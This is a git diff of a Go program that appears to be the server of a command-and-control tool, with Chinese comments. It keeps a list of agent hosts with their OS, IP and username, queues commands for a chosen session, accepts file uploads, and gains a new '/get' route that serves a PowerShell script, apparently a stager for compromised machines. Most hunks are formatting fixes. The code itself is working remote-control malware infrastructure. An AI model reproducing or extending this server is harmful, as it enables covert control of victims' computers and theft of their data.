@@ -4,8 +4,6 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
-	"github.com/fatih/color"
-	"github.com/olekukonko/tablewriter"
 	"io/ioutil"
 	"math/rand"
 	"net/http"
@@ -15,6 +13,9 @@ import (
 	"runtime"
 	"strings"
 	"time"
+
+	"github.com/fatih/color"
+	"github.com/olekukonko/tablewriter"
 
 	"github.com/axgle/mahonia"    //中文编码
 	"github.com/c-bata/go-prompt" // 增加tab 下拉菜单
@@ -39,7 +40,7 @@ var (
 	OS, Arch, IP, hostname, domain, username string //  func info_os()  表格变量
 	cmd                                      string = ""
 	AGENTS                                   map[string]string
-	session_id                               string=""
+	session_id                               string = ""
 	//全局变量
 )
 
@@ -64,6 +65,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 	url_re, _ := regexp.Compile("/re/*")
 	url_up, _ := regexp.Compile("/up/*")
 	url_img, _ := regexp.Compile("/img/*")
+	url_get, _ := regexp.Compile("/get")
 
 	//info
 	if url_info.MatchString(r.URL.Path) {
@@ -81,11 +83,11 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		//两点一判断id是否存在
 		//二判断请求id是否是设置的id
 		/*
-		在进入判断是否是设置的id
-		 */
+			在进入判断是否是设置的id
+		*/
 		_, ok := AGENTS[id]
 		if ok {
-			if id==session_id {
+			if id == session_id {
 				if cmd != "" {
 					fmt.Fprint(w, cmd)
 					cmd = ""
@@ -148,6 +150,15 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		file.Close()
 		fmt.Fprintf(w, ("ok upload"))
 
+	} else if url_get.MatchString(r.URL.Path) {
+		ps1, err := ioutil.ReadFile("./get.ps1")
+		if err != nil {
+			fmt.Println("Read file error", err)
+			fmt.Fprintln(w, "")
+			return
+		} else {
+			fmt.Fprintln(w, string(ps1))
+		}
 	} else {
 		//全都不匹配输出请求详细
 		//应增加ua头判断
@@ -229,7 +240,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 //打印全部主机信息
 func info_os() {
 
-	for k,v:=range AGENTS{
+	for k, v := range AGENTS {
 		info := strings.Split(v, "**")
 		OS = info[0]
 		IP = info[1]
@@ -307,14 +318,12 @@ func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
 func Session_id(id string) {
 	Blue := color.New(color.FgBlue).SprintFunc()
 	Red := color.New(color.FgRed).SprintFunc()
-	if len(strings.Split(id," "))>1{
-		session_id=strings.Split(id," ")[1]
+	if len(strings.Split(id, " ")) > 1 {
+		session_id = strings.Split(id, " ")[1]
 		fmt.Printf("%s setting Interact session id => %s.\n", Blue("[*]"), session_id)
-	}else {
-		fmt.Printf("%s set session err \n",Red("[*]"))
+	} else {
+		fmt.Printf("%s set session err \n", Red("[*]"))
 	}
-
-
 
 }
 
@@ -332,16 +341,16 @@ func Options() { //定义tab 下拉菜单选项参数
 				Scanf(&cmd)
 
 			}
-		}else if options == "help" {
+		} else if options == "help" {
 			fmt.Println(help)
-		}else if strings.Contains(options,"Interact") {
+		} else if strings.Contains(options, "Interact") {
 			Session_id(options)
-		}else if options == "session list" {
+		} else if options == "session list" {
 			info_os()
-		}else if options == "exit" {
+		} else if options == "exit" {
 			os.Exit(0)
 			break
-		}else{
+		} else {
 			fmt.Println("错误选项")
 		}
 		//switch {
